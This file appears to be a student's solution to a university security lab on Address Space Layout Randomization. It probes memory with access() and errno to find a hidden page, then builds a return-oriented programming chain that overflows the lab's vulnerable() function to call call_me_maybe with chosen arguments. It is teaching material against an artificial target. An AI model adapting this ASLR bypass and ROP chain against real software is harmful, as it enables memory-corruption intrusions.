/*
 * Address Space Layout Randomization
 * Part 3
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <time.h>
#include <mmintrin.h>
#include <xmmintrin.h>
#include <fcntl.h>
#include <errno.h>
#include <stdbool.h>
#include <x86intrin.h>
#include "lab.h"

// Same as in Part 2
extern void vulnerable(char *your_string);
extern void call_me_maybe(uint64_t rdi, uint64_t rsi, uint64_t rdx);

// Your code:
uint64_t find_address(uint64_t low_bound, uint64_t high_bound);
void do_overflow(uint64_t page_addr);

uint64_t find_address(uint64_t low_bound, uint64_t high_bound) {

	// Put your Part 1 code here
	// You are free to choose any of 1A, 1B, or 1C

	/*
	* Part 1A
	* Find and return the single mapped address within the range [low_bound, upper_bound).
	*/
    for (uint64_t addr = low_bound; addr < high_bound; addr += PAGE_SIZE) {
        // TODO: Figure out if "addr" is the correct address or not.
        char *c = (char*)addr;
        if (access(c, F_OK) != -1 || errno != EFAULT) {
            return addr;
        }
    }
    return 0;
}

/*
 * do_overflow
 * Construct the ROP chain and execute it using the gadgets we found by breaking ASLR.
 */
void do_overflow(uint64_t page_addr) {

	// Put your Part 2 code here
	// Use the page you found with find_address
	// and the offsets located from objdump to find your gadgets

		uint64_t your_string[128];

	// Fill the array with 0xFF's and set the last character to be a new line.
	memset(your_string, 0xFF, sizeof(your_string));
	your_string[127] = 0x000000000000000A;

	// For now we don't worry about ASLR, we can directly use these addresses:
	uint64_t gadget1_addr = page_addr;
	uint64_t gadget2_addr = gadget1_addr + 16;
	uint64_t gadget3_addr = gadget2_addr + 16;
	uint64_t gadget4_addr = gadget3_addr + 16;
	uint64_t gadget5_addr = gadget4_addr + 16;
	uint64_t gadget6_addr = gadget5_addr + 16;
	uint64_t call_me_maybe_addr = (uint64_t)&call_me_maybe;

	// Part 2B: Fill in your_string such that it configures the arguments
	// to call_me_maybe correctly, and then calls call_me_maybe.

	int i = 3;

    // rdi = 2
    your_string[i++] = gadget3_addr; // rdi=0
    your_string[i++] = gadget5_addr; // rdi=1
    your_string[i++] = gadget5_addr; // rdi=2

    // rsi = 2*rdi
    your_string[i++] = gadget6_addr; // rsi = rdi (2)
    your_string[i++] = gadget2_addr; // rsi <<= 1 -> 4

    // rdx = 1337
    your_string[i++] = gadget1_addr; // pop rax
    your_string[i++] = 191;          // value to pop into rax
    your_string[i++] = gadget4_addr; // rdx = rax*7 (→ 1337)

    // call the target function
    your_string[i++] = call_me_maybe_addr;


	// Recall that arg1 is rdi, arg2 is rsi, and arg3 is rdx.
	// See gadgets.s for the gadget definitions.

	vulnerable((char *)your_string);

}

/*
 * lab_code
 * This is called by main with the bounds for the hidden page, just
 * like in Part 1. You will locate the page and then execute a ROP
 * chain using payloads located in the page.
 */
void lab_code(uint64_t low_bound, uint64_t high_bound) {
	uint64_t found_page = find_address(low_bound, high_bound);
	do_overflow(found_page);
}
